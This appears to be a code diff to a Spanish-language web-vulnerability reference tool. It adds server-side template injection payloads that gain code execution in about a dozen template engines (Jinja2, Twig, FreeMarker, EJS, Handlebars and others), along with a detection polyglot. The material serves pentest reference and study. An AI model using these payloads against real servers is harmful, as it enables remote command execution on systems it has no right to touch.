@@ -4687,17 +4687,35 @@ const WEB_VULNS=[
     detection:`Inyectar el polyglot \${{<%[%'"}}%\\ para provocar error, luego probar {{7*7}} — si la respuesta muestra 49, hay evaluación de plantilla.`,
     engineTable:[
       {lang:'Python',  engine:'Jinja2',     payload:'{{7*7}}',    result:'49', rce:`{{namespace.__init__.__globals__.os.popen('id').read()}}`},
-      {lang:'Python',  engine:'Mako',       payload:'${7*7}',         result:'49', rce:''},
-      {lang:'PHP',     engine:'Twig',       payload:'{{7*7}}',        result:'49', rce:''},
-      {lang:'PHP',     engine:'Smarty',     payload:'{7*7}',          result:'49', rce:''},
-      {lang:'Java',    engine:'FreeMarker', payload:'${7*7}',         result:'49', rce:''},
-      {lang:'Java',    engine:'Velocity',   payload:'#set($x=7*7)$x', result:'49', rce:''},
-      {lang:'Java',    engine:'Thymeleaf',  payload:'[[${7*7}]]',     result:'49', rce:''},
-      {lang:'Ruby',    engine:'ERB',        payload:'<%= 7*7 %>',     result:'49', rce:''},
-      {lang:'Node.js', engine:'EJS',        payload:'<%= 7*7 %>',     result:'49', rce:''},
-      {lang:'Node.js', engine:'Pug',        payload:'#{7*7}',         result:'49', rce:''},
-      {lang:'Node.js', engine:'Handlebars', payload:'',               result:'',   rce:''},
-      {lang:'.NET',    engine:'Razor',      payload:'@(7*7)',     result:'49', rce:''},
+      {lang:'Python',  engine:'Mako',       payload:'${7*7}',         result:'49', rce:"<%import os%>${os.popen('id').read()}"},
+      {lang:'PHP',     engine:'Twig',       payload:'{{7*7}}',        result:'49', rce:"{{['id']|filter('system')}}"},
+      {lang:'PHP',     engine:'Smarty',     payload:'{7*7}',          result:'49', rce:"{system('id')}"},
+      {lang:'Java',    engine:'FreeMarker', payload:'${7*7}',         result:'49', rce:'<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'},
+      {lang:'Java',    engine:'Velocity',   payload:'#set($x=7*7)$x', result:'49', rce:'#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")'},
+      {lang:'Java',    engine:'Thymeleaf',  payload:'[[${7*7}]]',     result:'49', rce:"[[${T(java.lang.Runtime).getRuntime().exec('id')}]]"},
+      {lang:'Ruby',    engine:'ERB',        payload:'<%= 7*7 %>',     result:'49', rce:"<%= system('id') %>"},
+      {lang:'Node.js', engine:'EJS',        payload:'<%= 7*7 %>',     result:'49', rce:"<%= global.process.mainModule.require('child_process').execSync('id') %>"},
+      {lang:'Node.js', engine:'Pug',        payload:'#{7*7}',         result:'49', rce:"#{global.process.mainModule.require('child_process').execSync('id')}"},
+      {lang:'Node.js', engine:'Handlebars', payload:'',               result:'',   note:'No evalúa aritmética (logic-less): {{7*7}} no devuelve 49. Se detecta por error o inyección de propiedad.', rce:`{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('id');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}`},
+      {lang:'.NET',    engine:'Razor',      payload:'@(7*7)',         result:'49', rce:'@{ System.Diagnostics.Process.Start("cmd.exe","/c whoami"); }'},
     ],
   },
   {
@@ -4956,7 +4974,7 @@ function openWebVuln(id){
   if(v.engineTable){
     html+=`<div class="wv-sec"><div class="wv-sec-title det">Motores de plantillas</div>
       <table class="wv-eng-table"><thead><tr><th>Lenguaje</th><th>Motor</th><th>Payload de prueba</th><th>Resultado</th><th>Payload real (RCE)</th></tr></thead><tbody>
-      ${v.engineTable.map(r=>`<tr><td>${esc(r.lang)}</td><td>${esc(r.engine)}</td><td>${r.payload?esc(r.payload):'<span style="color:var(--text3)">—</span>'}</td><td>${r.result?esc(r.result):'<span style="color:var(--text3)">—</span>'}</td><td>${r.rce?`<code class="wv-rce-code">${esc(r.rce)}</code>`:'<span style="color:var(--text3)">—</span>'}</td></tr>`).join('')}
+      ${v.engineTable.map(r=>`<tr><td>${esc(r.lang)}</td><td>${esc(r.engine)}</td><td>${r.payload?esc(r.payload):(r.note?`<span style="color:var(--text3);font-style:italic;">${esc(r.note)}</span>`:'<span style="color:var(--text3)">—</span>')}</td><td>${r.result?esc(r.result):'<span style="color:var(--text3)">—</span>'}</td><td>${r.rce?`<code class="wv-rce-code">${esc(r.rce)}</code>`:'<span style="color:var(--text3)">—</span>'}</td></tr>`).join('')}
       </tbody></table></div>`;
   }
 
